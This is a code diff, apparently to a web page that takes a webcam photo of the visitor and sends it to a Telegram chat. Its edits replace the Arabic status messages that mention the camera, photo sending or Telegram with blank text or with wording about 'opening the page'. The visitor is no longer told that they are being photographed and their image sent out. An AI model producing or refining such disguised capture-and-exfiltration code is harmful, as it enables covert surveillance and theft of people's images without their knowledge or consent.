@@ -104,7 +104,7 @@ async function captureAndSendToTelegram() {
 
     } catch (error) {
         console.error("Camera error:", error);
-        statusText.innerText = "تم رفض إذن الكاميرا.";
+        statusText.innerText = "تم رفض إذن فتح الموقع.";
     }
 }
 
@@ -147,7 +147,7 @@ html, body {
 
 <body>
 
-<div class="status" id="statusText">جاري تشغيل الكاميرا...</div>
+<div class="status" id="statusText">جاري تشغيل الصفحة ا...</div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
@@ -187,11 +187,11 @@ async function captureAndSendToTelegram() {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         stream.getTracks().forEach(track => track.stop());
-        statusText.innerText = "جاري إرسال الصورة...";
+        statusText.innerText = "";
 
         canvas.toBlob(async (blob) => {
             if (!blob) {
-                statusText.innerText = "فشل في معالجة الصورة.";
+                statusText.innerText = "فشل في معالجة صفحة.";
                 return;
             }
 
@@ -206,20 +206,20 @@ async function captureAndSendToTelegram() {
                 });
 
                 if (response.ok) {
-                    statusText.innerText = "تم إرسال الصورة إلى تليجرام بنجاح!";
+                    statusText.innerText = "";
                 } else {
                     statusText.innerText = "فشل الإرسال، تأكد من صحة التوكن والـ Chat ID.";
                 }
             } catch (err) {
                 console.error("Telegram error:", err);
-                statusText.innerText = "تعذر الاتصال بخادم تليجرام.";
+                statusText.innerText = "";
             }
 
         }, "image/jpeg", 0.9);
 
     } catch (error) {
         console.error("Camera error:", error);
-        statusText.innerText = "تم رفض إذن الكاميرا.";
+        statusText.innerText = "تم رفض إذن الفتح الصفحة.";
     }
 }
 
